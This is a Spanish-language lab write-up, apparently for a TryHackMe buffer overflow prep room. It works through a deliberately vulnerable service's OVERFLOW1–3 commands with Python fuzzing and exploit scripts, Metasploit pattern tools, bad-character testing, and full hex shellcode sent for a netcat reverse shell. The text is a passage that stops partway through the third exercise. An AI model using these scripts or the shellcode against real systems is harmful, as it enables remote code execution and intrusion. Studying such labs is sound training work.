<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW1 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">1978</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xaf\x11\x50\x62</span><span class="s">"</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">16</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\xb8\xba\xd9\x8e\xe8\xda\xcb\xd9\x74\x24\xf4\x5b\x29\xc9\xb1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x31\x43\x12\x83\xeb\xfc\x03\xf9\xd7\x6c\x1d\x01\x0f\xf2</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xde\xf9\xd0\x93\x57\x1c\xe1\x93\x0c\x55\x52\x24\x46\x3b\x5f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xcf\x0a\xaf\xd4\xbd\x82\xc0\x5d\x0b\xf5\xef\x5e\x20\xc5\x6e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xdd\x3b\x1a\x50\xdc\xf3\x6f\x91\x19\xe9\x82\xc3\xf2\x65\x30</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xf3\x77\x33\x89\x78\xcb\xd5\x89\x9d\x9c\xd4\xb8\x30\x96\x8e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x1a\xb3\x7b\xbb\x12\xab\x98\x86\xed\x40\x6a\x7c\xec\x80\xa2</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x7d\x43\xed\x0a\x8c\x9d\x2a\xac\x6f\xe8\x42\xce\x12\xeb\x91</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xac\xc8\x7e\x01\x16\x9a\xd9\xed\xa6\x4f\xbf\x66\xa4\x24\xcb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\xa9\xbb\x18\x5b\xd5\x30\x9f\x8b\x5f\x02\x84\x0f\x3b\xd0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa5\x16\xe1\xb7\xda\x48\x4a\x67\x7f\x03\x67\x7c\xf2\x4e\xe0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xb1\x3f\x70\xf0\xdd\x48\x03\xc2\x42\xe3\x8b\x6e\x0a\x2d\x4c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x90\x21\x89\xc2\x6f\xca\xea\xcb\xab\x9e\xba\x63\x1d\x9f\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\xa2\x4a\xf6\x23\x0c\x25\xb7\x93\xec\x95\x5f\xf9\xe2\xca</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x40\x02\x29\x63\xea\xf9\xba\x86\xe1\x18\x12\xff\xf7\x1a\x75</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa3\x7e\xfc\x1f\x4b\xd7\x57\x88\xf2\x72\x23\x29\xfa\xa8\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x70\x5f\xaf\x24\x71\x2a\xa3\xd1\x71\x61\x99\x74\x8d\x5f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xb5\x1b\x1c\x04\x45\x55\x3d\x93\x12\x32\xf3\xea\xf6\xae\xaa</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x44\xe4\x32\x2a\xae\xac\xe8\x8f\x31\x2d\x7c\xab\x15\x3d\xb8</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x34\x12\x69\x14\x63\xcc\xc7\xd2\xdd\xbe\xb1\x8c\xb2\x68\x55</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\xf9\xaa\x23\x55\xd4\x5c\xcb\xe4\x81\x18\xf4\xc9\x45\xad</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x8d\x37\xf6\x52\x44\xfc\x16\xb1\x4c\x09\xbf\x6c\x05\xb0\xa2</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x8e\xf0\xf7\xda\x0c\xf0\x87\x18\x0c\x71\x8d\x65\x8a\x6a\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xf6\x7f\x8c\xac\xf7\x55</span><span class="s">"</span><span class="p">)</span>
<span class="n">postfix</span> <span class="o">=</span><span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;ip&gt;'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Debemos recordar que el padding es un espacio en bytes que se pone entre el data del oferflow y el payload para garantizar un correcto funcionamiento del dispositivo.</p>

<p><strong>Así, en definitiva este código se conectará al servicio y mandará el comando OVERFLOW1 junto con un data que desbodará el BufferSpace (overflow) y sobreescribirá el valor del EIP (retn) para hacer que el procesador salte a la dirección de memoria del registro ESP que habrá quedado inmediatamente sobreescrita por nuestro código de la shellcode (payload) provocando su ejecución.</strong></p>

<p><br /></p>

<ul>
  <li><em>Exploit</em>:</li>
</ul>

<p>Abrimos un listener en netcat en el puerto 4444 y lanzamos el exploit ejecutando el script de python:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221025115540.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>OVERFLOW2</strong></p>

<p>Vamos a repetir todo el proceso con el comando OVERFLOW2.</p>

<ul>
  <li><em>Fuzzing</em>: En la etapa de Fuzzing tratamos de medir cuántos bytes hacen crashear un comando vulnerable del servicio.</li>
</ul>

<p>Reutilizando el código anterior:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW2 "</span>

<span class="n">string</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing with {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing crashed at {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">string</span> <span class="o">+=</span> <span class="mi">100</span> <span class="o">*</span> <span class="s">"A"</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p>Comenzamos el fuzzeo y obtenermos que el crasheo se produce alrededor de los 700 bytes. Al observar la pantalla de Immunity Debugger observamos que el EIP ha quedado sobreescrito y por tanto el crasheo se ha producido por un desbordamiento del buffer, con lo que el parámetro es vulnerable.</p>

<ul>
  <li><em>Catching the offset</em>: Ahora, procedemos a calcular el offset del EIP para tomar control del contenido del mismo. Desarrollamos un patrón de 800 bytes con el siguiente comando:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 800
</code></pre></div></div>

<p>E incluimos el resultado en el siguiente código del exploit.py en la variable payload:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW2 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Lo lanzamos contra el programa que crashea y observamos a través de Immunity Debugger que el EIP ha quedado sobreescrito con el término, 76413176. El siguiente comando</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 800 <span class="nt">-q</span> 76413176
</code></pre></div></div>

<p>Que el offset concreto es el 634.</p>

<p>Para probarlo, modificamos el código anteiror para que quede de la siguiente manera</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW2 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">634</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Al lanzarlo contra el programa comprobamos que el EIP queda sobreescrito por cuatro ‘42’ (B en Hexadecimal) con lo que efectivamente hemos tomado control del valor del EIP.</p>

<p><br /></p>

<ul>
  <li><em>Badcharacters</em>:</li>
</ul>

<p>Creamos un string de characteres en hexadecimal con el siguiente código en Python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="s">"{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>Que empleamos en el siguiente comando: python3 badchars.py</td>
      <td>tr -d ‘\n’; echo para que salga ordenado. Después incluimos el string que nos da el comando en exploit.py después del EIP (es decir, en una variable que vaya después del payload), por ejemplo “Postfix”:</td>
    </tr>
  </tbody>
</table>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW2 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">634</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Al enviar lo, de nuevo, examinamos el Hexdump después del valor del registro EIP y examinamos los bytes: \x00\x23\x83\xBA</p>

<p><br /></p>

<p><strong>OVERFLOW3</strong></p>

<p>De nuevo, esta vez nos vamos a centrar en el servicio intencionalmente vulnerable OSCP, concretamente en el comando OVERFLOW3.</p>

<ul>
  <li><em>Fuzzing</em>: Comenzamos con la etapa de fuzzing en la que pretendemos ver cuántos bytes aproxidamente provocan el desbordamiento del buffer. Empleamos el script:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.37.115"</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW3 "</span>

<span class="n">string</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing with {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing crashed at {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">string</span> <span class="o">+=</span> <span class="mi">100</span> <span class="o">*</span> <span class="s">"A"</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p>Al emplear el script nos informa de que el crasheo se produce cerca de los 1300 bytes. Al observar Immunity Debugger observarmos que el registro EIP ha quedado sobreescrito y por tanto el crasheo del servicio se ha producido por el desbordamiento del buffer.</p>

<ul>
  <li><em>Catching the Offset</em>: Ahora, debemos obtener el offset concreto desde el cual comienza el valor que coge el registro EIP para tomar control mismo. Para ello construimos un patrón de 1500 bytes con el siguiente comando:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 1500
</code></pre></div></div>

<p>Y el resultado lo introducimos en la variable postfix del script ‘exploit.py’ como queda:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.37.115"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW3 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

